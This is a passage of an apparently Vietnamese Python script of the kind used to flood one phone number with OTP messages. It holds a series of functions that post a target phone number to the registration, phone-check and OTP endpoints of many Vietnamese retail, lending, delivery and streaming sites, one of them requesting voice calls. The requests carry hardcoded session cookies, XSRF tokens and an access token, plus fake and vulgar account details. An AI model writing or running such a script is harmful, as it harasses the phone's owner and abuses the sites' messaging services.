    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'cookie': 'cdp_customerIdentify=1; _atm_objs=eyJzb3VyY2UiOiJnb29nbGUiLCJtZWRpdW0iOiJjcGMiLCJjYW1wYWlnbiI6ImFkd29yZHMiLCJj%0D%0Ab250ZW50IjoiYWR3b3JkcyIsInRlcm0iOiJhZHdvcmRzIiwidHlwZSI6ImFzc29jaWF0ZV91dG0i%0D%0ALCJjaGVja3N1bSI6IioiLCJ0aW1lIjoxNjkxMTMyOTkxOTI1fQ%3D%3D; _pk_ref.564990546.fc16=%5B%22%22%2C%22%22%2C1691132992%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.564990546.fc16=*; _gcl_au=1.1.750634817.1691132992; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; _gcl_aw=GCL.1691132997.CjwKCAjww7KmBhAyEiwA5-PUSs-mCDku8Sxt0B5X_-yhmAOnL6cUXPEwZJkOzTTVT-WicOl_DV9YiRoC3-sQAvD_BwE; form_key=BaxX2D1YXnWpW3Jp; _ac_au_gt=1691132993384; _ga=GA1.1.1612590689.1691132998; _fbp=fb.1.1691132998475.1386127342; _asm_uid=1200155066; cdp_session=1; cdp_blocked_sid_1207269=1; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; PHPSESSID=gj8tho2itg02igcokprgmcjuf4; form_key=BaxX2D1YXnWpW3Jp; _tt_enable_cookie=1; _ttp=h1r1vnub7F72iOjwOvqUYxSNAyc; _ac_client_id=1200147765.1691133070; au_id=1200147765; private_content_version=2fa7f4ae56c1c82407ce8b8a65c64a5a; _asm_visitor_type=r; mage-cache-sessid=true; _cdp_cfg=1; cdp_blocked_sid_5056307=true; _utm_objs=; _pk_id.564990546.fc16=1200147765.1691132992.1.1691133481.1691132992.; _ac_an_session=zhzqzgzgzmzgzlzmzhzhzdzjzdzizlzqzizizgzgznzrzhzdzizdzizlzqzizizgzgznzrzhzdzizlzqzizizgzgznzrzhzdzizdzhznzdzhzd2f27zdzgzdzezizd; _ga_T93VCQ3ZQS=GS1.1.1691132998.1.1.1691133485.25.0.0; cto_bundle=AEYB1l9hMjZ2c3JEcU9hVlI2c0FGUTBkeVV6ZXRUUEJKNjhwOVdqenR6Z0FuYnB1WW1LOTQ4ZHBZOEViRUJ0Q2dzajN2b3lRMDRYbjB5VTVoSEwlMkJnWjFqY05Ualg0WnpGMkpqY2dNWXNGcmMlMkI3eHh2MmthNnY2UXY1VndkeVpIVFY2c1BldDRnOFdkQUk3ZzMlMkJRQlpHVXBYYXclM0QlM0Q; section_data_ids=%7B%22customer%22%3A1691133495%2C%22cart%22%3A1691133495%2C%22shipping_address_selected%22%3A1691133495%2C%22compare-products%22%3A1691133495%2C%22last-ordered-items%22%3A1691133495%2C%22directory-data%22%3A1691133495%2C%22captcha%22%3A1691133495%2C%22instant-purchase%22%3A1691133495%2C%22persistent%22%3A1691133495%2C%22review%22%3A1691133495%2C%22wishlist%22%3A1691133495%2C%22faq%22%3A1691133495%2C%22ammessages%22%3A1691133495%2C%22rewards%22%3A1691133495%2C%22ins%22%3A1691133495%2C%22custom_address_local_storage_data%22%3A1691133495%2C%22recently_viewed_product%22%3A1691133495%2C%22recently_compared_product%22%3A1691133495%2C%22product_data_storage%22%3A1691133495%2C%22paypal-billing-agreement%22%3A1691133495%7D',
    'origin': 'https://www.kidsplaza.vn',
    'pragma': 'no-cache',
    'referer': 'https://www.kidsplaza.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    json_data = {
    'data': {
        'password': 'Vjyi1234',
        'confirm_password': 'Vjyi1234',
        'phone': phone,
        'email': 'concak@gmail.com',
        'name': 'tên cái lồn',
        'website_id': '1',
    },
}

    response = requests.post(
    'https://www.kidsplaza.vn/rest/hn/V1/customer/account/register/on-site',
    cookies=cookies,
    headers=headers,
    json=json_data,
)
        ###
def robot(sdt):
    cookies = {
    '_gcl_au': '1.1.1698620040.1690890499',
    '_fbp': 'fb.1.1690890500462.1646373504',
    'mousestats_vi': '78a3bb625f6a326b5378',
    '_ym_uid': '1690890501680762237',
    '_ym_d': '1690890501',
    '_tt_enable_cookie': '1',
    '_ttp': '9xN9J9ceiqBWtCD4J-snzQy-IMK',
    'supportOnlineTalkID': 'PdWml2EntxKFO94Tzz5Tukkfs3Mpr587',
    '_gid': 'GA1.2.1482684126.1691085426',
    '_ym_isad': '2',
    '__cfruid': 'e2a605e6b2debb72dc47446271f7c7af82536dd8-1691137448',
    'mousestats_si': '33cfb258b0d250994a1d',
    '_clck': '1tdoi1d|2|fdv|0|1308',
    '_ym_visorc': 'w',
    'XSRF-TOKEN': 'eyJpdiI6Im92OWYwNlJSaExmVTZFbjBucWl2Q0E9PSIsInZhbHVlIjoiS20vbWx5WWxrNXplZ3BqZ3p2aHoyY3JVT0lMSTgwSi8xaXhnSWZPN0Nuam1BS291MUxCb3BTUEU0T3hSekVDaG5ZNjdMQnNvWThsNGlZanN6dnNoWmxscDd3ajEvN1pJQmFXNzlWTk1PK0VyZ2hhU0xCVzg0WmJwYmlCSkkxTW4iLCJtYWMiOiIzM2Q1MzE5ZTZiNzc4NGM1MGJjZWJiODNlOGZhZDg0N2ZiMjIzNjY3OTNkYTAyNTZhNzAwNWE2Y2Y5YzVkMTg5IiwidGFnIjoiIn0%3D',
    'sessionid': 'eyJpdiI6IjRCNzdSa1VzR2lydHFQNXZKUkt4VHc9PSIsInZhbHVlIjoiSlRmU1VWL3BpVlRUK2cvNHN6SFhDQitrZzBkLy81MExaSWd3UE9UMzFFOHpQN0V2N1JqSjcwTWZ4QVBqcFZxVWpxK0xwTnorKzVGeDRhZG9IRFo3WVBoL3BITDRvMHpPeG5SWDlnMGlsS3M3TEw3K1pBbXJjOUNLTlRYdUU3WlUiLCJtYWMiOiI0MTNiZjJkZDY5MzU1MmFkOTBjM2ZkMjUyYTQzNDA1NWU3NTM2NjE0YmM4Mzg4YjZkYTNiYTgwMDhjMzg4N2VhIiwidGFnIjoiIn0%3D',
    'utm_uid': 'eyJpdiI6IjAza0ZITmxwaThIcWdLRm1DUTkxZGc9PSIsInZhbHVlIjoiRmFMeW1RZWgyY2ZLSndxS1p0N1NVN3Myems1Ty9pUWlDczN0MnhNVmJhRXNITDZ0RU9iVWpMTDBTQitjQXlBbkNybWdjT1RDWkFIUDlsRHR3S3RRalNQcHdicWptQkhiN1l4VTVHOGE1RHgwc3MrYW5ITkV1b1pmTVlIRWtkclEiLCJtYWMiOiIwNjlmMmI0ZGM5ZGZkMzdkYWU1ZDUxMWM1NzU1NTkyNjE0NTY3N2ZmOGY2MmFkM2JmMzk2YjRiOTI4ZjkwZGFkIiwidGFnIjoiIn0%3D',
    'ec_etag_utm': '8e8f2df3-37da-cbb8-92ad-834def089367',
    'ec_cache_utm': '8e8f2df3-37da-cbb8-92ad-834def089367',
    'ec_etag_client': 'false',
    'ec_cache_client': 'false',
    'ec_cache_client_utm': '%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%7D',
    'ec_etag_client_utm': '%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%7D',
    '_ga': 'GA1.1.838151185.1690890503',
    '_ga_EBK41LH7H5': 'GS1.1.1691137450.4.1.1691137476.0.0.0',
    '_ga_0YC73N6F7R': 'GS1.2.1691137450.3.1.1691137477.33.0.0',
    '_clsk': '1qlfd4s|1691137478234|2|1|z.clarity.ms/collect',
    'ec_png_utm': '8e8f2df3-37da-cbb8-92ad-834def089367',
    'uid': '8e8f2df3-37da-cbb8-92ad-834def089367',
    'ec_png_client': 'false',
    'client': 'false',
    'ec_png_client_utm': '%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%7D',
    'client_utm': '%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%7D',
}

    headers = {
    'authority': 'robocash.vn',
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'cookie': '_gcl_au=1.1.1698620040.1690890499; _fbp=fb.1.1690890500462.1646373504; mousestats_vi=78a3bb625f6a326b5378; _ym_uid=1690890501680762237; _ym_d=1690890501; _tt_enable_cookie=1; _ttp=9xN9J9ceiqBWtCD4J-snzQy-IMK; supportOnlineTalkID=PdWml2EntxKFO94Tzz5Tukkfs3Mpr587; _gid=GA1.2.1482684126.1691085426; _ym_isad=2; __cfruid=e2a605e6b2debb72dc47446271f7c7af82536dd8-1691137448; mousestats_si=33cfb258b0d250994a1d; _clck=1tdoi1d|2|fdv|0|1308; _ym_visorc=w; XSRF-TOKEN=eyJpdiI6Im92OWYwNlJSaExmVTZFbjBucWl2Q0E9PSIsInZhbHVlIjoiS20vbWx5WWxrNXplZ3BqZ3p2aHoyY3JVT0lMSTgwSi8xaXhnSWZPN0Nuam1BS291MUxCb3BTUEU0T3hSekVDaG5ZNjdMQnNvWThsNGlZanN6dnNoWmxscDd3ajEvN1pJQmFXNzlWTk1PK0VyZ2hhU0xCVzg0WmJwYmlCSkkxTW4iLCJtYWMiOiIzM2Q1MzE5ZTZiNzc4NGM1MGJjZWJiODNlOGZhZDg0N2ZiMjIzNjY3OTNkYTAyNTZhNzAwNWE2Y2Y5YzVkMTg5IiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6IjRCNzdSa1VzR2lydHFQNXZKUkt4VHc9PSIsInZhbHVlIjoiSlRmU1VWL3BpVlRUK2cvNHN6SFhDQitrZzBkLy81MExaSWd3UE9UMzFFOHpQN0V2N1JqSjcwTWZ4QVBqcFZxVWpxK0xwTnorKzVGeDRhZG9IRFo3WVBoL3BITDRvMHpPeG5SWDlnMGlsS3M3TEw3K1pBbXJjOUNLTlRYdUU3WlUiLCJtYWMiOiI0MTNiZjJkZDY5MzU1MmFkOTBjM2ZkMjUyYTQzNDA1NWU3NTM2NjE0YmM4Mzg4YjZkYTNiYTgwMDhjMzg4N2VhIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IjAza0ZITmxwaThIcWdLRm1DUTkxZGc9PSIsInZhbHVlIjoiRmFMeW1RZWgyY2ZLSndxS1p0N1NVN3Myems1Ty9pUWlDczN0MnhNVmJhRXNITDZ0RU9iVWpMTDBTQitjQXlBbkNybWdjT1RDWkFIUDlsRHR3S3RRalNQcHdicWptQkhiN1l4VTVHOGE1RHgwc3MrYW5ITkV1b1pmTVlIRWtkclEiLCJtYWMiOiIwNjlmMmI0ZGM5ZGZkMzdkYWU1ZDUxMWM1NzU1NTkyNjE0NTY3N2ZmOGY2MmFkM2JmMzk2YjRiOTI4ZjkwZGFkIiwidGFnIjoiIn0%3D; ec_etag_utm=8e8f2df3-37da-cbb8-92ad-834def089367; ec_cache_utm=8e8f2df3-37da-cbb8-92ad-834def089367; ec_etag_client=false; ec_cache_client=false; ec_cache_client_utm=%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%7D; ec_etag_client_utm=%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%7D; _ga=GA1.1.838151185.1690890503; _ga_EBK41LH7H5=GS1.1.1691137450.4.1.1691137476.0.0.0; _ga_0YC73N6F7R=GS1.2.1691137450.3.1.1691137477.33.0.0; _clsk=1qlfd4s|1691137478234|2|1|z.clarity.ms/collect; ec_png_utm=8e8f2df3-37da-cbb8-92ad-834def089367; uid=8e8f2df3-37da-cbb8-92ad-834def089367; ec_png_client=false; client=false; ec_png_client_utm=%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%7D; client_utm=%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%7D',
    'origin': 'https://robocash.vn',
    'pragma': 'no-cache',
    'referer': 'https://robocash.vn/register',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'phone': phone,
    '_token': 'ZrC9tGxwcMfUIY8eTecrRiRQgA0G6AMjYTHBUdTb',
}

    response = requests.post('https://robocash.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)

def phuc(sdt):
    headers = {
        'authority': 'api-crownx.winmart.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'origin': 'https://order.phuclong.com.vn',
        'referer': 'https://order.phuclong.com.vn/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'phoneNumber': phone,
        'fullName': 'NGUYEN VAN QUANG',
        'email': 'huyshyg@gmail.com',
        'password': 'Yy*aqiv9C3EbSc9',
    }

    response = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register', headers=headers, json=json_data)

def emart(sdt):
    cookies = {
        'emartsess': 'co6sm2ug3klvnf1gjgnrt08p86',
        'default': '867a312b183aa657ef35aaf066',
        'language': 'vietn',
        'currency': 'VND',
        '_fbp': 'fb.2.1697028933768.2082637603',
        '_gid': 'GA1.3.63825357.1697028934',
        'emartCookie': 'Y',
        '_ga_ZTB26JV4YJ': 'GS1.1.1697028934.1.1.1697028991.0.0.0',
        '_ga': 'GA1.1.1449699251.1697028934',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'emartsess=co6sm2ug3klvnf1gjgnrt08p86; default=867a312b183aa657ef35aaf066; language=vietn; currency=VND; _fbp=fb.2.1697028933768.2082637603; _gid=GA1.3.63825357.1697028934; emartCookie=Y; _ga_ZTB26JV4YJ=GS1.1.1697028934.1.1.1697028991.0.0.0; _ga=GA1.1.1449699251.1697028934',
        'Origin': 'https://emartmall.com.vn',
        'Referer': 'https://emartmall.com.vn/index.php?route=account/register',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'mobile': phone,
    }

    response = requests.post(
        'https://emartmall.com.vn/index.php?route=account/register/checkCustomerMobile',
        cookies=cookies,
        headers=headers,
        data=data,
    )
def hana(sdt):
    headers = {
        'authority': 'api.hanagold.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://hanagold.vn',
        'referer': 'https://hanagold.vn/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'token': 'null',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'email': '',
        'mobile': phone,
        'fullname': 'VI VAN QUANG',
        'password': 'wj4JkXnsSU6iAVN',
    }

    response = requests.post('https://api.hanagold.vn/app/auth/register', headers=headers, json=json_data)

def med(sdt):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://id-v121.medpro.com.vn',
        'Referer': 'https://id-v121.medpro.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'appid': '',
        'cskhtoken': '',
        'locale': '',
        'momoid': '',
        'osid': '',
        'ostoken': '',
        'partnerid': '',
        'platform': 'pc',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
    }

    response = requests.post('https://api-v2.medpro.com.vn/user/check-user-info-by-phone', headers=headers, json=json_data)

def ghn(sdt):
    headers = {
        'authority': 'online-gateway.ghn.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://sso.ghn.vn',
        'referer': 'https://sso.ghn.vn/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
        'type': 'register',
    }

    response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)

def shop(sdt):
    cookies = {
        '_gcl_au': '1.1.736119640.1697028536',
        '_ga': 'GA1.2.1586553404.1697028537',
        '_gid': 'GA1.2.2120353063.1697028537',
        '_gat_UA-78703708-2': '1',
        '_fbp': 'fb.1.1697028536909.1885736545',
        '_ga_P138SCK22P': 'GS1.1.1697028536.1.1.1697028548.48.0.0',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': '_gcl_au=1.1.736119640.1697028536; _ga=GA1.2.1586553404.1697028537; _gid=GA1.2.2120353063.1697028537; _gat_UA-78703708-2=1; _fbp=fb.1.1697028536909.1885736545; _ga_P138SCK22P=GS1.1.1697028536.1.1.1697028548.48.0.0',
        'Origin': 'https://shopiness.vn',
        'Referer': 'https://shopiness.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'action': 'verify-registration-info',
        'phoneNumber': phone,
        'refCode': '',
    }

    response = requests.post('https://shopiness.vn/ajax/user', cookies=cookies, headers=headers, data=data)

def gala(sdt):
    headers = {
        'authority': 'api.glxplay.io',
        'accept': '*/*',
        'accept-language': 'vi',
        'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiI4Mjc5NDMyMC04YzE1LTRhZWUtOTQ1OC05ZTY1ODBlNGI0NzQiLCJkaWQiOiI3YjQwYmY2Zi03NWU5LTQ0NWUtYTcxYi0wZGY0NzVjZDVlMWMiLCJpcCI6IjExNi4xMDEuMTk1LjE1MCIsIm1pZCI6Ik5vbmUiLCJwbHQiOiJ3ZWJ8cGN8d2luZG93c3wxMHxjaHJvbWUiLCJhcHBfdmVyc2lvbiI6IjIuMC4wIiwiaWF0IjoxNjk3MDI4NDI0LCJleHAiOjE3MTI1ODA0MjR9.sPC31v3PQdVShos8pUKg0G-vw-bcM_Z9NBe4suS58L4',
        # 'content-length': '0',
        'origin': 'https://galaxyplay.vn',
        'referer': 'https://galaxyplay.vn/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'phone': phone,
        'typeOtp': 'voice',
    }

    response = requests.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers)

def khia(sdt):
    cookies = {
        '_fbp': 'fb.1.1697028065833.1270865214',
        '_gid': 'GA1.2.881366396.1697028066',
        '_ym_uid': '1697028067826155926',
        '_ym_d': '1697028067',
        '_ym_isad': '2',
        '_ym_visorc': 'w',
        '_fw_crm_v': '04e1fa01-80b1-44bb-98f6-0d9e39a434a4',
        '_gat_UA-145475427-1': '1',
        '_ga': 'GA1.2.1773028141.1697028066',
        '_ga_SRXSFEV4P2': 'GS1.2.1697028066.1.1.1697028198.55.0.0',
        '_ga_C4D01W1NNN': 'GS1.1.1697028065.1.1.1697028199.54.0.0',
    }

    headers = {
        'authority': 'api.senmo.vn',
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        # 'cookie': '_fbp=fb.1.1697028065833.1270865214; _gid=GA1.2.881366396.1697028066; _ym_uid=1697028067826155926; _ym_d=1697028067; _ym_isad=2; _ym_visorc=w; _fw_crm_v=04e1fa01-80b1-44bb-98f6-0d9e39a434a4; _gat_UA-145475427-1=1; _ga=GA1.2.1773028141.1697028066; _ga_SRXSFEV4P2=GS1.2.1697028066.1.1.1697028198.55.0.0; _ga_C4D01W1NNN=GS1.1.1697028065.1.1.1697028199.54.0.0',
        'origin': 'https://senmo.vn',
        'referer': 'https://senmo.vn/user/registration/reg1',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'full_name': 'VI VAN QUANG',
        'first_name': 'QUANG',
        'last_name': 'VI',
        'middle_name': 'VAN',
        'mobile_phone': phone,
        'target_url': 'https://senmo.vn/?utm_source=direct&utm_medium=direct&utm_campaign=direct',
    }

    response = requests.post('https://api.senmo.vn/api/user', cookies=cookies, headers=headers, json=json_data)

def robo(sdt):
    cookies = {
    '_gcl_au': '1.1.1698620040.1690890499',
    '_fbp': 'fb.1.1690890500462.1646373504',
    'mousestats_vi': '78a3bb625f6a326b5378',
    '_ym_uid': '1690890501680762237',
    '_ym_d': '1690890501',
    '_tt_enable_cookie': '1',
    '_ttp': '9xN9J9ceiqBWtCD4J-snzQy-IMK',
    'supportOnlineTalkID': 'PdWml2EntxKFO94Tzz5Tukkfs3Mpr587',
    '__cfruid': '379a4dfa76833650548bf45dda0d77e540e4fcd7-1692458313',
    '_gid': 'GA1.2.2086604549.1692458321',
    'mousestats_si': '5e4f6cf34182fec603de',
    '_clck': '1tdoi1d|2|fea|0|1308',
    '_ym_isad': '2',
    '_ym_visorc': 'w',
    'XSRF-TOKEN': 'eyJpdiI6ImZaaERzNGVYRG11M3dtMTI5ZVRmanc9PSIsInZhbHVlIjoicWZ0ZzhadjEyanZ4M29nVEtmRnlEcUxHSUh1a0R6aCt2SVorbld0N0ZldXNNcFBUYlJXSTkyYThqMW52OWNhSjI4amVuTWQyL0llV3R1K3pYWU15RVlxQUR6cGd4Wjc0cERIYzVvb3BHSzIyeXJjdklPNXdDZTl1L1EvVjRuSGciLCJtYWMiOiI0YTRkOWQ5OTg3YmE1NTg3NWQ3MGI0ZjI3NzA1OWJjYmEzZGMxNWJmZTJjN2YwOTgzZjdjNzMzMjI2MjA1NGE2IiwidGFnIjoiIn0%3D',
    'sessionid': 'eyJpdiI6IjJRZ0NVaGdDMEFXZHZ1cUZuaXJIRnc9PSIsInZhbHVlIjoib3lnTzJQamkzaDRCaEluaE1FRUpVYWdhN0JTamJMZmphWjk4Nm1qRXZsNitGK1N1UXd1YXh6d0srUXdzQWZmZUEvR3IydWVZekZHVk44ZnQzOEZuQS9GVHZVMFMzSXBJeE4wWVluNTA2R2tpclV6UktrcFJUb05RSkVBRDlqVjAiLCJtYWMiOiIwZjc1MzAwNjc3MWE4NWNlZjNmMzJkNDdmYzRjYmQ0YTNiYTFjMDBkZGQ1NWJmMWFiY2MxZmJhMDE5ZjA4MDU1IiwidGFnIjoiIn0%3D',
    'utm_uid': 'eyJpdiI6InliOSs2U1ZZV1RJT2c2cG9HRmhrUUE9PSIsInZhbHVlIjoiaHpIdmkrOEtmNWNzSjdRVnVYbnl5TzlrdStkMUxzVWM0bkV2UXZrRlVVUDdMV0wxeTNUYmcxdnB5N3duUWRvZzRkSkRnREZYMnBFU1ByREcvQjhvS0xNYkx1Z01ZUk5FYi9WSnJ4S09GamxtY0czT0crN0FoWGYxZEF2UnY1MEEiLCJtYWMiOiI5MDJkYjUxNWEwNzJmMGQzZTE5YWJjYjU1MDIzMzJjNzgyMzY5OTE0NDhkYTRmMmI0OGJmMGZlZWE5NDMzN2IzIiwidGFnIjoiIn0%3D',
    'ec_cache_utm': '8e8f2df3-37da-cbb8-92ad-834def089367',
    'ec_cache_client': 'false',
    'ec_cache_client_utm': '%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%7D',
    'ec_png_utm': '8e8f2df3-37da-cbb8-92ad-834def089367',
    'ec_png_client': 'false',
